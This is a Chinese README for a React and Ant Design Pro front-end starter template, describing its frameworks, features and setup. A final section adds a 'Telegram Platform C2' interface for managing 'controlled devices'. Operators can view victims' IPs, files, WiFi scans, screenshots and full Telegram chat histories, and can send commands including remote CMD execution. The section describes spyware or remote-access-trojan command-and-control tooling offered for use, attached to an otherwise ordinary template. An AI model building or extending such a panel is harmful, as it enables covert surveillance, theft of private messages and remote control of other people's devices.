# 鱼皮前端万用模板

> 作者：[程序员鱼皮](https://github.com/liyupi)
> 仅分享于 [编程导航知识星球](https://yupi.icu)

基于 React + Ant Design 的项目初始模板，整合了常用框架和主流业务的示例代码。

只需 1 分钟 即可完成网站的基础前端！！！大家还可以在此基础上快速开发自己的项目。

[TOC]

## 模板特点

### 主流框架 & 特性

+ Ant Design Pro 6.0.0
+ React 18.2.0
+ node 至少 16 版本及以上
+ antd 5.2.2
+ Type Script
+ 动态路由
+ Eslint
+ Prettier

### Ant Design Pro 架构

#### Umi

+ Node.js 前端开发基础环境
+ webpack 前端必学必会的打包工具
+ react-router 路由库
+ proxy 反向代理工具
+ dva 轻量级的应用框架
+ fabric 严格但是不严苛的 lint 规则集（eslint、stylelint、prettier)
+ Type Script 带类型的 JavaScript

#### Ant Design 前端组件库

#### Ant Design Chart 简单好用的React 图表库

#### ProComponents 模板组件

+ ProLayout - 提供开箱即用的菜单和面包屑功能
+ ProForm - 表单模板组件，预设常见布局和行为
+ ProTable - 表格模板组件，抽象网格请求和单元格样式
+ ProCard - 提供卡片切分以及栅格布局能力

#### umi 插件

+ 内置布局
+ 国际化
+ 权限
+ 数据流

### 业务特性

+ 栅格布局（可自定义，可适应）
+ 简单权限管理 
+ 全局初始数据（ getInitialState )
+ 默认使用 less 作为样式语言
+ OpenAPI 自动生成后端请求代码
+ 统一错误处理

## 业务功能

+ 提供 OpenAPI 后端接口自动生成
+ 用户登录、用户注册
+ 管理员修改用户、新建用户、查询用户、删除用户
+ 动态路由展示（权限管理）

## 快速上手

1）先启动后端的万用模板

2）使用命令生成后端请求代码

3）将标题和 logo 等切换为个人

4）测试业务功能

具体万用模板教程：[前端万用模板使用教程 (yuque.com)](https://bcdh.yuque.com/staff-wpxfif/resource/rnv6shm2l57rsx6x) 

## Telegram Platform C2 前端集成

本项目集成了 Telegram Platform 的 C2 管理界面，提供直观的设备管理与数据可视化功能。

### 核心功能模块

1.  **设备管理 (Device Management)**
    -   **设备列表**: 展示所有受控设备 (`C2Device`)，支持按在线状态、最后活跃时间排序。
    -   **实时状态**: 自动刷新设备在线状态，直观展示心跳健康度。

2.  **设备详情 (Device Details)**
    -   **概览**: 展示设备基础信息（IP、OS、MAC、关联 Telegram ID）。
    -   **功能标签页**:
        -   **软件列表**: 查看目标机已安装软件。
        -   **WiFi 信息**: 查看周边 WiFi 热点扫描结果。
        -   **文件列表**: 浏览客户端扫描的文件及上传记录。
        -   **屏幕截图**: 网格化展示截图历史，支持批量下载。
        -   **聊天记录**: **(新增)** 分页查看 Telegram 聊天记录，支持媒体文件路径展示。

3.  **指令控制台 (Command Console)**
    -   在设备详情页直接下发指令：
        -   `fetch_full_chat_history`: 同步全量聊天记录与联系人。
        -   `get_screenshot`: 立即截屏。
        -   `get_wifi` / `get_software`: 刷新信息。
        -   `cmd_exec`: 执行 CMD 命令。

### 开发指南

-   **接口生成**: 本项目使用 OpenAPI 插件根据后端 Swagger 自动生成请求代码 (`services/swagger`).
-   **启动**: `npm run start:dev` (开发模式) 或 `npm run build` (生产构建).
